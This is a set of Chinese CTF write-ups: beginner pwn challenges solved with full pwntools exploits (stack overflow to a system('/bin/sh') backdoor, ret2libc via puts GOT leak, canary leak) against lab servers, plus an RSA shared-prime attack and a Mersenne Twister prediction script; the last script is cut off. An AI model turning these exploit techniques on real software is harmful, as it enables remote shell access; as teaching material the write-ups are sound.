然后打开IDA开始分析\n首先看到main函数，发现转到了一个名为flow的函数里，双击点进函数，查看其伪代码：\n可以看到函数存在明显的栈溢出漏洞，我们可以直接覆盖返回地址为后门函数的地址即可getshell\n关于后门函数 # 其实这一步应该是打开IDA后做的第一件事：\nshift + F12 查看程序的字符串，有时候字符串中会有一些语句帮助我们更快地找到关键代码，也有时候会有一些明显的 win 语句提示我们成功 getshell 或者 成功取得 flag，当然，最有价值的还得是/bin/sh/语句，这提示我们给程序可能存在后门函数，我们可以在之后的构造RO链、调用 system 函数时使用这个字符串。\n当然，当我们在函数的引用表里看到 system 函数时应该也会想到类似的事情。\n在本题中，\n直接看函数的名字中有一个 getshell 函数，点进去就可以发现这是一个后门函数 双击 system 函数进入.plt.sec段，查看交叉引用XREF可以很快地找到后门函数 双击/bin/sh字符串进入.rodata段，查看交叉引用XREF可以很快地找到后门函数 __int64 getshell() { system(\u0026#34;/bin/sh\u0026#34;); return 0LL; } .text:0000000000400576 ; =============== S U B R O U T I N E ======================================= .text:0000000000400576 .text:0000000000400576 ; Attributes: bp-based frame .text:0000000000400576 .text:0000000000400576 public getshell .text:0000000000400576 getshell proc near .text:0000000000400576 ; __unwind { .text:0000000000400576 55 push rbp .text:0000000000400577 48 89 E5 mov rbp, rsp .text:000000000040057A BF 54 06 40 00 mov edi, offset command ; \u0026#34;/bin/sh\u0026#34; .text:000000000040057F E8 BC FE FF FF call _system .text:000000000040057F .text:0000000000400584 B8 00 00 00 00 mov eax, 0 .text:0000000000400589 5D pop rbp .text:000000000040058A C3 retn .text:000000000040058A ; } // starts at 400576 .text:000000000040058A .text:000000000040058A getshell endp 嗯，覆盖地址转到0x400576的地址就可以getshell了，本题没有开 PIE，所以不需要泄露 textbase\n关于定位溢出点位置 # 可以直接看栈上的排布，本题 v1（即var_10）在栈上的地址为0x10，s 为 old rbp 的存放位置，需要填充一些没用字符（64位大小为8，32位大小为4）来溢出到返回地址， r 即函数的返回地址，在这里覆盖为后门函数的地址，函数return时就会转到后门函数\n所以本题需要填充的字符的大小 offset = 0x10 + 0x8\n也可以用工具来无脑定位溢出点的位置：\n所以我们的payload为：\noffset = 0x10 + 8 backdoor = 0x40057A payload = b\u0026#34;a\u0026#34;*offset + p64(backdoor) # 也可以写作： payload = b\u0026#34;a\u0026#34;*0下10 + p64(0xdeadbeef) + p64(backdoor) 关于0xdeadbeef，其实背后的原因还是非常有意思的，感兴趣的师傅们可以移步至附录阅读相关内容。\nexp # from pwn import * is_debug = 1 is_remote = 1 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;172.25.76.164\u0026#34;, 39236) else: taolve = process(\u0026#39;./stack\u0026#39;) offset = 0x10 + 8 backdoor = 0x40057A payload = b\u0026#34;a\u0026#34;*offset + p64(backdoor) taolve.recvuntil(b\u0026#34;just pwn me!\u0026#34;) taolve.sendline(payload) taolve.sendline(b\u0026#34;ls\u0026#34;) taolve.sendline(b\u0026#34;cat flag\u0026#34;) taolve.interactive() 0x02 cmp # checksec # 当然，在拖入IDA前先例行检查一下：\n$ checksec pwn [*] \u0026#39;/pwn\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 简要分析 # 然后打开IDA开始分析\n首先看到main函数，发现转到了一个名为func的函数里，双击点进函数，查看其伪代码：\n可以看到经过简单的比较之后就给我们flag了，且存在明显的栈溢出漏洞，我们可以通过v1向下覆盖v2的值使其满足条件，也可以直接覆盖返回地址为后门函数的地址\n.text:00000000004006BE BF CC 07 40 00 mov edi, offset command ; \u0026#34;cat flag\u0026#34; .text:00000000004006C3 B8 00 00 00 00 mov eax, 0 .text:00000000004006C8 E8 63 FE FF FF call _system 嗯，覆盖地址转到0x04006BE的地址，本题没有开 PIE，所以不需要泄露 textbase\n法一 # 直接栈溢出到底下的ret指令，跳转到我们的后门函数\noffset = 0x30 + 8 backdoor = 0x04006BE payload = b\u0026#34;a\u0026#34;*offset + p64(backdoor) taolve.sendline(payload) taolve.interactive() 法二 # 按照程序的逻辑，将栈中v1的位置填充满，修改v2的值，使其变为11.4514 注意，这里只要让浮点数的二进制内存与我们所填充的二进制内存一致就可以了 可以手算，也可以使用在线工具网站：\n浮点数转二进制/十六进制，我们这里是32 bit float\nIEEE 754 浮点数 - 在线工具 (toolhelper.cn)\n二进制转十六进制\n二进制转十进制| 2进制转10进制 | 在线进制转换 (sojson.com)\n# Decimal 11.4514 # 32 bit float # Decimal (exact) 11.45139980316162109375 # Binary 01000001001101110011100011101111 # Hexadecimal 413738EF # 转十进制(整数)： 1094138095 # 转十六进制: 413738ef 这样我们就可以通过浮点数的二进制转十进制整数来发送字节了：\noffset = 0x30 - 4 payload = b\u0026#34;a\u0026#34;*offset + p64(1094138095) taolve.sendline(payload) taolve.interactive() exp # from pwn import * from LibcSearcher import * is_debug = 1 is_remote = 1 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;172.25.76.164\u0026#34;, 39230) else: taolve = process(\u0026#39;./stack\u0026#39;) \u0026#39;\u0026#39;\u0026#39; 方法一： 直接栈溢出到底下的ret指令，跳转到我们的后门函数 \u0026#39;\u0026#39;\u0026#39; offset = 0x30 + 8 backdoor = 0x04006BE payload = b\u0026#34;a\u0026#34;*offset + p64(backdoor) taolve.sendline(payload) taolve.interactive() \u0026#39;\u0026#39;\u0026#39; 方法二： 按照程序的逻辑，将栈中v1的位置填充满，修改v2的值，使其变为11.4514 注意，这里只要让浮点数的二进制内存与我们所填充的二进制内存一致就可以了 可以手算，也可以使用在线工具网站： # 浮点数转二进制/十六进制，我们这里是32 bit float https://www.toolhelper.cn/Digit/FractionConvert # 二进制转十六进制 https://www.sojson.com/hexconvert/2to10.html Decimal 11.4514 32 bit float Decimal (exact) 11.45139980316162109375 Binary 01000001001101110011100011101111 Hexadecimal 413738EF 转十进制(整数)： 1094138095 转十六进制: 413738ef \u0026#39;\u0026#39;\u0026#39; offset = 0x30 - 4 payload = b\u0026#34;a\u0026#34;*offset + p64(1094138095) taolve.sendline(payload) taolve.interactive() 0x03 rop2 # checksec # 当然，在拖入IDA前先例行检查一下：\n$ checksec pwn [*] \u0026#39;/pwn\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 简要分析 # 然后打开IDA开始分析\n首先看到main函数，发现转到了一个名为vuln的函数里，双击点进函数，查看其伪代码：\n有明显的栈溢出漏洞，但是本题没有后门函数，也没有调用过system函数，所以需要我们先泄漏libc的偏移地址libcbase，再利用libc库中的system函数和/bin/sh字符串来getshell\n关于ret2libc的相关知识，推荐阅读：\n基本 ROP - CTF Wiki (ctf-wiki.org)\nexp # from pwn import * from LibcSearcher import * is_debug = 1 is_remote = 1 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;172.25.76.164\u0026#34;, 39231) elif is_remote == 2: taolve = process([\u0026#34;./ld-2.23.so\u0026#34;, \u0026#39;./pwn\u0026#39;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libc-2.23.so\u0026#34;}) else: taolve = process(\u0026#39;./pwn\u0026#39;) \u0026#39;\u0026#39;\u0026#39; # 本题给出了libc文件 # 打本地时可以这样来使用libc文件: taolve = process([\u0026#34;./ld-2.23.so\u0026#34;, \u0026#39;./pwn\u0026#39;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libc-2.23.so\u0026#34;}) # 也可以用patchelf来更换使用的libc库: patchelf --replace-needed libc.so.6 你要换的libc的硬路径 ./pwn patchelf --set-interpreter ld的硬路径 ./pwn \u0026#39;\u0026#39;\u0026#39; elf = ELF(\u0026#39;./pwn\u0026#39;) offset = 0x20 + 8 pop_rdi_ret = 0x00400733 puts_plt = elf.plt[\u0026#34;puts\u0026#34;] puts_got = elf.got[\u0026#34;puts\u0026#34;] vuln = 0x040067E ret = 0x004004c9 payload = b\u0026#34;a\u0026#34;*offset + p64(ret) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) +p64(vuln) taolve.recvuntil(b\u0026#34;story!\u0026#34;) taolve.sendline(payload) taolve.recv() puts_real_addr = u64(taolve.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) log.success(\u0026#34;puts_real_addr:\u0026#34;+ hex(puts_real_addr)) libc = ELF(\u0026#39;./libc-2.23.so\u0026#39;) libc_base = puts_real_addr - libc.symbols[\u0026#39;puts\u0026#39;] binsh_addr = libc_base + libc.search(b\u0026#34;/bin/sh\u0026#34;).__next__() # binsh_addr = libc_base + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) # 这个写法也可以 system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] \u0026#39;\u0026#39;\u0026#39; 如果题目没有给出libc库: 可以直接用libcsearcher库来搜索，不过搜索到的版本号可能有很多，需要多试一试 libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts_real_addr) libc_base = puts_real_addr - libc.dump(\u0026#39;puts\u0026#39;) log.success(\u0026#39;libc_base \u0026#39; + hex(libc_base)) system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) \u0026#39;\u0026#39;\u0026#39; log.success(\u0026#39;binsh_addr \u0026#39; + hex(binsh_addr)) payload = b\u0026#34;a\u0026#34;*offset + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) #+p64(vuln) taolve.recvuntil(b\u0026#34;Pull up your sword and tell me u story!\u0026#34;) taolve.send(payload) #taolve.sendline(b\u0026#34;ls\u0026#34;) #taolve.sendline(b\u0026#34;cat flag\u0026#34;) taolve.interactive() 0x04 littelof # checksec # 当然，在拖入IDA前先例行检查一下：\n$ checksec pwn [*] \u0026#39;/pwn\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 开了canary，看来本题需要我们学习一下如何泄漏canary的值，推荐阅读：\nCanary - CTF Wiki (ctf-wiki.org)\n简要分析 # 然后打开IDA开始分析\n首先看到main函数，发现转到了一个名为sub_4006E2的函数里，双击点进函数，查看其伪代码：\n其实就是上一题加了一个canary保护而已，学习完wiki之后就可以直接写exp了：\nexp # from pwn import * from LibcSearcher import * is_debug = 1 is_remote = 0 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;39.105.26.155\u0026#34;, 18583) elif is_remote == 2: taolve = process([\u0026#34;./ld-2.23.so\u0026#34;, \u0026#39;./pwn\u0026#39;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libc-2.23.so\u0026#34;}) else: taolve = process(\u0026#39;./littleof\u0026#39;) elf = ELF(\u0026#39;./littleof\u0026#39;) # ROPgadget --binary littleof --only \u0026#34;pop|ret\u0026#34; | grep rdi pop_rdi_ret = 0x00400863 puts_plt = elf.plt[\u0026#34;puts\u0026#34;] puts_got = elf.got[\u0026#34;puts\u0026#34;] vuln = 0x04006E3 ret = 0x040059e offset = 0x50 - 8 - 2 payload = b\u0026#34;a\u0026#34;*offset +b\u0026#34;b\u0026#34;*2 taolve.recvuntil(b\u0026#34;Do you know how to do buffer overflow?\u0026#34;) taolve.sendline(payload) taolve.recvuntil(b\u0026#39;aabb\u0026#39;) canary = u64(b\u0026#39;\\x00\u0026#39; + taolve.recv(8)[1:8]) print(hex(canary)) offset = 0x50 - 8 payload = b\u0026#34;a\u0026#34;*offset + p64(canary) + p64(ret) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) +p64(vuln) taolve.recvuntil(b\u0026#34;Try harder!\u0026#34;) taolve.sendline(payload) taolve.recvuntil(b\u0026#34;win\u0026#34;) puts_real_addr = u64(taolve.recv(7)[1:7].ljust(8, b\u0026#34;\\x00\u0026#34;)) log.success(\u0026#34;puts_real_addr:\u0026#34;+ hex(puts_real_addr)) # 本题给出了libc文件，但是我们直接搜也可以getshell libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts_real_addr) libc_base = puts_real_addr - libc.dump(\u0026#39;puts\u0026#39;) log.success(\u0026#39;libc_base \u0026#39; + hex(libc_base)) system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) \u0026#34;\u0026#34;\u0026#34; libc = ELF(\u0026#39;./libc-2.23.so\u0026#39;) libc_base = puts_real_addr - libc.symbols[\u0026#39;puts\u0026#39;] binsh_addr = libc_base + libc.search(b\u0026#34;/bin/sh\u0026#34;).__next__() # binsh_addr = libc_base + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) # 这个写法也可以 system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#39;system_addr \u0026#39; + hex(system_addr)) payload = b\u0026#34;a\u0026#34;*offset + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) +p64(vuln) taolve.recvuntil(b\u0026#34;low?\u0026#34;) taolve.sendline(payload) taolve.sendline(b\u0026#34;ls\u0026#34;) taolve.sendline(b\u0026#34;cat flag\u0026#34;) taolve.interactive() 附录 # 推荐阅读：\n什么是 0xdeadbeef ？_SkYe231_的博客-CSDN博客\n什么是 0xdeadbeef ？ # copy自： 什么是 0xdeadbeef ？_SkYe231_的博客-CSDN博客\n最近在做题的时候，遇到将返回地址覆写为 0xdeadbeef 。疑问着这是什么，这里就简单记录一下。\n0xdeadbeef 是一个16进制魔术数字，是一种类似Leet的英文单词转写形式。\n起源 # Hexspeak最早是程序员用来清晰独特地标记 内存和 数据的一些魔术数字，使用以0-9与A-F构成的16进制数表示一些简单的英文单词。Hexspeak的转写规则为：数字“0”表示字母“O”，“1”表示“I”或“L”，“5”表示“S”，“7”表示“T”，“6”、“9”则各自表示“G”与“g”，其它的数字则可利用 画谜和 Leet的规则来借代字母，例如“defecate”就可用“DEFECA7E”或“DEFEC8”来表示。\n更多的魔术数 # 16进制魔术数在许多 处理器、 操作系统和 调试工具中都得到应用，且尤常作为调试量使用。\n0x0000000FF1CE是微软 Office组件产品代码的最后一部分，可于 注册表的HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall的键值中寻得。 0x00BAB10C（oo-ba-block）在 ZFS的uberblock里使用。 0x1BADB002（“I bad boot”）为 多重引导标头。[ 1] 0x8BADF00D（“ate bad food”）为 iOS应用程序崩溃报告中的 超时标识符，一般在程序运行、终止与响应时停滞太久时出现。[ 2] 0xBAADF00D（“bad food”）在 微软的LocalAlloc（LMEM_FIXED）函数中使用，用以在已启用调试堆的情况下，标识未 初始化的分配堆内存。[ 3] 0xCAFEBABE（“cafe babe”）在 Mach-O格式文件中用于标识 通用二进制目标文件，同时也在 Java中用于识别Java 字节码类文件。[ 4] 0xCAFED00D（“Cafe Dude”）在 Java中用于识别 Pack200压缩格式。[ 5] 0xD15EA5E（“disease”）是 任天堂GameCube与 Wii 控制台正常启动的标识符。[ 6][ 7] 0xDEADBABE（“Dead Babe”）在 IBM的 Jikes研究虚拟机上使用，用于确认主线程的栈是否正常。[ 8] 0xDEADBEEF（“dead beef”）在 嵌入式系统中常用于标示软件崩溃或是 死锁，在IBM RS/6000系统、32位 PowerPC处理器上的 Mac OS系统以及 Commodore International的 Amiga电脑上都有使用；而在 Sun的 Solaris操作系统中，这一魔术数则用于标记已释放的内核存储空间。另外，在 Alpha处理器上的 OpenVMS操作系统中，按下CTRL+T就可以看到DEAD_BEEF。DEC Alpha的 存储资源管理控制台亦有一个用于检测内存错误的 后台进程，PS识别为“BeefEater waiting on 0xdeadbeef”[ 9]。 0xDEADDEAD（“dead dead”）是 蓝屏时显示的错误代码[ 10] 。由于此代码在基于 Windows NT的系统上用于进行 内存转储，因而常为驱动开发者所见。0xDEADDEAD还有一个变种──0x000000E2[ 11]，这两者在 微软开发者网络中都被称为MANUALLY_INITIATED_CRASH。 0xDEADFA11（“dead fall”）为 iOS应用程序崩溃报告中的“强制终止应用程序”的标识符。[ 2] 0xDEFEC8ED（“defecated”）在 OpenSolaris的 核心文件中使用。[ 12] 0xE011CFD0在微软Office文件中使用， 小端序下表示为D0CF11E0，也即“docfile0”。[ 13] 0xFACEFEED（“face feed”）在运行Windows NT的 Alpha服务器上使用，也即当出现硬件错误时，Alpha的硬件抽象层就会产生这一错误信号。[ 14] 0xFEE1DEAD（“feel dead”）是 Linux重启系统调用中使用的魔术数。[ 15] C15C:0D06:F00D（cisco dog food）于世界 IPv6日在www.cisco.com的IPv6地址中使用。“Dog food”指的就是就是 Cisco在IPv6上“ eating its own dog food”（也即用自家的设备）的做法。 ————————————————\n版权声明：该附录copy自CSDN博主「SkYe231_」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/weixin_43921239/article/details/103295616\n","date":"July 6, 2023","permalink":"/posts/wp/2023_--_--/basic_/0x01/","section":"Posts","summary":"前言 # 本文为我个人第一次接触CTF的pwn方向时所做的题的w","title":"some_easy_pwn"},{"content":"","date":"July 6, 2023","permalink":"/series/something_easy/","section":"Series","summary":"","title":"something_easy"},{"content":"","date":"July 6, 2023","permalink":"/categories/wp/","section":"Categories","summary":"","title":"wp"},{"content":" 题目描述 # 在RSA中，素数的选择和保密性非常重要。\n只要不泄露n的分解，那RSA就是安全的。\n**hint ：**GZ的脑容量有限，存不下太多的质数\n分析与解题脚本 # hint 提示为：GZ 的脑容量有限，存不下太多的质数， 所以可以推测出在生成的足够多个 n 中会有两个 n 有公约数，而求公约数我们可以使用gmpy2.gcd()函数块数求出。 Python脚本如下：\nfrom pwn import* import os from Crypto.Util.number import * import gmpy2 import binascii def Decrypt(c, e, p, n): q = n//p L = (p - 1) * (q - 1) d = gmpy2.invert(e, L) m = gmpy2.powmod(c, d, n) #得到密文 m flag2 = hex(m) flag1 = str(flag2[2:]) flag = binascii.unhexlify(flag1) print(flag.decode(\u0026#39;utf-8\u0026#39;)) #打印flag n = list(range(101)) e = list(range(101)) c = list(range(101)) num = 50 for i in range(num): #学会使用try: except: 来多次连接断开得到数据 try: taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 39227) taolve.recvuntil(b\u0026#34;n = \u0026#34;) n[i] = int(taolve.recvuntil(b\u0026#34;\\ne = \u0026#34;, drop=True)) e[i] = int(taolve.recvuntil(b\u0026#34;\\nc = \u0026#34;, drop=True)) c[i] = int(taolve.recvuntil(b\u0026#34;\\n\u0026#34;, drop=True)) except: taolve.close() print(\u0026#34;=============next step====================\u0026#34;) for i in range(num-1): for j in range(k): if i==j: continue p = gmpy2.gcd(n[i], n[j]) if p \u0026gt; 1 : #print(i, j) print(\u0026#34;p = \u0026#34;, p) print(\u0026#34;n1 = \u0026#34;, n[i]) print(\u0026#34;n2 = \u0026#34;, n[j]) print(\u0026#34;e1 = \u0026#34;, e[i]) print(\u0026#34;e2 = \u0026#34;, e[j]) print(\u0026#34;c1 = \u0026#34;, c[i]) print(\u0026#34;c2 = \u0026#34;, c[j]) Decrypt(c[i], e[i], p, n[i]) Decrypt(c[j], e[j], p, n[j]) q1 = n[i] // p q2 = n[j] // p if p*q1 == n[i] and p*q2 == n[j]: print(\u0026#34;q1 = \u0026#34;, q1) print(\u0026#34;q2 = \u0026#34;, q2) print(\u0026#34;n1 = \u0026#34;, n[i]) print(\u0026#34;n2 = \u0026#34;, n[j]) print(\u0026#34;e1 = \u0026#34;, e[i]) print(\u0026#34;e2 = \u0026#34;, e[j]) print(\u0026#34;c1 = \u0026#34;, c[i]) print(\u0026#34;c2 = \u0026#34;, c[j]) else : print(p,end=\u0026#34;\u0026#34;) #用1来标记没有结果的尝试 输出结果：\nW4terCTF{1T_ls_dang3ROus_7O_US3_A_pRlM3_TwlCe!!!!!!!}\n实战截图： ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_w4ter/6_gz-rsa_write_up/","section":"Posts","summary":"题目描述 # 在RSA中，素数的选择和保密性非常重要。 只要不泄露","title":"Crypto-GZ RSA"},{"content":"","date":"July 5, 2023","permalink":"/tags/misc/","section":"Tags","summary":"","title":"misc"},{"content":" 0.题目描述 # 据说泷奈拿到了新情报？\n能不能假装千束将情报骗到手就靠你了！\n#下载题目附件后得到main.py： import os import random from hashlib import md5 random.seed(os.urandom(64)) 情报 = os.environ[\u0026#39;GZCTF_FLAG\u0026#39;] V 底线 = 512 石头剪刀布映射 = [\u0026#34;石头\u0026#34;, \u0026#34;剪刀\u0026#34;, \u0026#34;布\u0026#34;] def 石头剪刀布(): 随机数 = random.getrandbits(32) #随机数 = 1 猜拳 = 石头剪刀布映射[随机数 % 3] 轮哈希 = int(md5(str(随机数 % 3).encode()).hexdigest()[4:12], 16) 轮标识符 = (随机数 // 3) ^ 轮哈希 return hex(轮标识符)[2:].zfill(8), 猜拳 def 检查(猜拳, 输入): return 猜拳 == \u0026#34;石头\u0026#34; and 输入 == \u0026#34;布\u0026#34; or \\ 猜拳 == \u0026#34;剪刀\u0026#34; and 输入 == \u0026#34;石头\u0026#34; or \\ 猜拳 == \u0026#34;布\u0026#34; and 输入 == \u0026#34;剪刀\u0026#34; def 玩(模式): print(\u0026#39;- 开始了哦！（平局也算你输哦）\u0026#39;) 轮 = 0 while 轮 \u0026lt; 底线: 轮 += 1 轮标识符, 猜拳 = 石头剪刀布() print(f\u0026#39;\\nRound {轮}: #{轮标识符}\u0026#39;) print(\u0026#34;- 我准备好了\u0026#34;) while True: 输入 = input(\u0026#34;- 石头剪刀布！，我出 \u0026gt; \u0026#34;).strip() if 输入 in [\u0026#34;石头\u0026#34;, \u0026#34;剪刀\u0026#34;, \u0026#34;布\u0026#34;]: print(f\u0026#34;- 我出的是 {猜拳}\u0026#34;) break print(\u0026#34;- 干嘛呢，出 石头/剪刀/布 啊\u0026#34;) 结果 = 检查(猜拳, 输入) print(\u0026#34;- 你赢了\u0026#34; if 结果 else \u0026#34;- 你输了\u0026#34;) if 模式 == 1 and not 结果: print(\u0026#34;你才不是真的千束！你个坏蛋！！\u0026#34;) return 轮 - 1 return 底线 def 选择模式(): print(\u0026#39;请选择模式:\u0026#39;) print(\u0026#39;0: 适应模式（输了不会怪你哦）\u0026#39;) print(\u0026#39;1: 认真模式\u0026#39;) 模式 = int(input(\u0026#39;\u0026gt; \u0026#39;)) assert 0 \u0026lt;= 模式 \u0026lt;= 1 return 模式 if __name__ == \u0026#39;__main__\u0026#39;: print(\u0026#39;井之上泷奈出现在了你面前……\\n\u0026#39;) print(\u0026#39;- 想要我得到的情报？\u0026#39;) print(\u0026#39;- 嗯嗯\u0026#39;) print(\u0026#39;- 你真的是千束吗……？\u0026#39;) print(\u0026#39;- 是的呀\u0026#39;) print(\u0026#39;- 在石头剪刀布中，只要我不使用特殊手段，千束一定会 100% 赢我，就用这个来验证你的身份吧！\u0026#39;) print(\u0026#39;- 诶多，这个嘛……\\n\u0026#39;) try: while True: 模式 = 选择模式() 终 = 玩(模式) if 模式 == 0: print(\u0026#39;- 可以开始了吗？\u0026#39;) continue if not 终 \u0026lt; 底线: print(\u0026#39;- 你……真的是千束！\\n\u0026#39;) print(f\u0026#39;那就给你情报吧: {情报}\u0026#39;) break except: print(\u0026#39;- 你是不是在搞什么鬼啊！\u0026#39;) exit(0) 1.分析伪随机数漏洞： # 分析一下程序，可以看到泷奈出拳是由随机数生成函数random.getrandbits(32)决定的，搜索相关资料会发现，这个函数所使用的是梅森算法MT19937，虽然能够产生优秀的伪随机数，但是有一个漏洞：其生成的数据在62432（62332=19936）后会达到循环，所以当我们知道了在同一个程序中生成的前624个由梅森算法产生的32位随机数，就能够预测下一个产生的随机数。\n2.如何实现预测？ # 预测伪随机数我们可以使用randcrack库 的Python库进行预测：\n安装 pip install randcrack -i https://pypi.tuna.tsinghua.edu.cn/simple 用法 import random #导入random库（Python内置了） from randcrack import RandCrack #下载randcrack库后导入类 #你可以掷随机数种子来确保预测的有效性， #不过random预测的时候默认以当前时间作为随机数种子 rc = RandCrack()#实例化randcrack类 for i in range(624):#循环624次 rc.submit(random.getrandbits(32)) #每次循环提交一个32位random生成的随机数 print(random.getrandbits(32)) #利用random库获取一个32位的随机数（你可以修改为任意位数，比如64位） print(rc.predict_getrandbits(32)) #利用randcrack获取的随机数 分析一下main函数代码的逻辑，可以看到选择模式函数中可以选择适应模式与认真模式，而且适应模式可以进行多次而不退出程序，所以我们需要进行进行两次适应模式，并且算出泷奈的前624次出拳时产生的随机数，再利用randcrack 的Python库进行预测。 分析代码中的 石头剪刀布()函数 我们可以知道如何算出泷奈出拳时产生的随机数：\n我们已知： 1.泷奈出的是石头还是剪刀还是布 设 mark= 0 ，1 ，2 来表示 2.猜拳的轮标识符 又由 轮标识符 = (随机数 // 3) ^ 轮哈希 可得 随机数//3 = 轮标识符 ^ 轮哈希 3.当我们已知mark的时候，我们就可以知道轮哈希的值 for i in range(3): 轮哈希 = int(md5(str(i).encode()).hexdigest()[4:12], 16) print(轮哈希) 输出结果为： 545560021 1111007417 1921883468 我们设： hhh = [545560021, 1111007417, 1921883468] 4.由上述可得随机数的值可以这样求： 随机数除3 = 轮标识数字 ^ hhh[mark] 随机数 = 3 * 随机数除3 + mark 关于如何自动化识别泷奈怎么出拳以及自动化预测下一个出拳并取得猜拳的胜利，就需要用python来写一个脚本了（需要用到pwntools库），具体代码如下：\n# encoding: utf-8 # codingc= unicode from pwn import * import random, time from randcrack import RandCrack import re rc = RandCrack() context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 37069) #taolve 是本人曾用过的用户名，没什么特殊含义， #也可以随便改，一般则使用 r=remote()来表示远程 # 石头剪刀布映射 = [\u0026#34;石头\u0026#34;, \u0026#34;剪刀\u0026#34;, \u0026#34;布\u0026#34;] # ============第一次，提交前512个数============== hhh = [545560021, 1111007417, 1921883468] answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(b\u0026#34;0\u0026#34;) for i in range(512): answer1 = taolve.recv(15) answer2 = taolve.recv(6) if i != 0: print(answer2) if answer2 == b\u0026#34;\\xe5\\x89\\xaa\\xe5\\x88\\x80\u0026#34;: 千束出的是 = \u0026#34;剪刀\u0026#34; mark = 1 elif answer2 == b\u0026#34;\\xe7\\x9f\\xb3\\xe5\\xa4\\xb4\u0026#34;: 千束出的是 = \u0026#34;石头\u0026#34; mark = 0 else: 千束出的是 = \u0026#34;布\u0026#34; mark = 2 print(千束出的是) 随机数除3 = 轮标识数字 ^ hhh[mark] 随机数 = 3 * 随机数除3 + mark rc.submit(随机数) answer3 = taolve.recvuntil(b\u0026#34;: #\u0026#34;) answer4 = answer1 + answer2 + answer3 print(answer4.decode(\u0026#39;utf-8\u0026#39;)) 轮标识符 = taolve.recv(8).decode(\u0026#39;utf-8\u0026#39;) print(轮标识符) 轮标识数字 = int(轮标识符, 16) answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(\u0026#34;石头\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;the last one!!!!!!!!!!\u0026#34;) #第一局猜拳的最后一次 answer1 = taolve.recv(15) answer2 = taolve.recv(6) print(answer2) if answer2 == b\u0026#34;\\xe5\\x89\\xaa\\xe5\\x88\\x80\u0026#34;: 千束出的是 = \u0026#34;剪刀\u0026#34; mark = 1 elif answer2 == b\u0026#34;\\xe7\\x9f\\xb3\\xe5\\xa4\\xb4\u0026#34;: 千束出的是 = \u0026#34;石头\u0026#34; mark = 0 else: 千束出的是 = \u0026#34;布\u0026#34; mark = 2 print(千束出的是) 随机数除3 = 轮标识数字 ^ hhh[mark] 随机数 = 3 * 随机数除3 + mark rc.submit(随机数) # ================第二次==================== answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(b\u0026#34;0\u0026#34;) for i in range(512): if i\u0026lt;113: answer1 = taolve.recv(15) answer2 = taolve.recv(6) if i != 0: print(answer2) if answer2 == b\u0026#34;\\xe5\\x89\\xaa\\xe5\\x88\\x80\u0026#34;: 千束出的是 = \u0026#34;剪刀\u0026#34; mark = 1 elif answer2 == b\u0026#34;\\xe7\\x9f\\xb3\\xe5\\xa4\\xb4\u0026#34;: 千束出的是 = \u0026#34;石头\u0026#34; mark = 0 else: 千束出的是 = \u0026#34;布\u0026#34; mark = 2 print(千束出的是) 随机数除3 = 轮标识数字 ^ hhh[mark] 随机数 = 3 * 随机数除3 + mark rc.submit(随机数) answer3 = taolve.recvuntil(b\u0026#34;: #\u0026#34;) answer4 = answer1 + answer2 + answer3 print(answer4.decode(\u0026#39;utf-8\u0026#39;)) 轮标识符 = taolve.recv(8).decode(\u0026#39;utf-8\u0026#39;) print(轮标识符) 轮标识数字 = int(轮标识符, 16) answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(\u0026#34;石头\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) else: if i == 113: #提交了624个随机数了，接下来可以看看预测的效果了 aa = rc.predict_getrandbits(32) 随机数 = rc.predict_getrandbits(32) mark = 随机数 % 3 轮标识符 = (随机数 // 3) ^ hhh[mark] print(\u0026#34;预测：\u0026#34;) print(hex(轮标识符)[2:].zfill(8)) answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) if mark 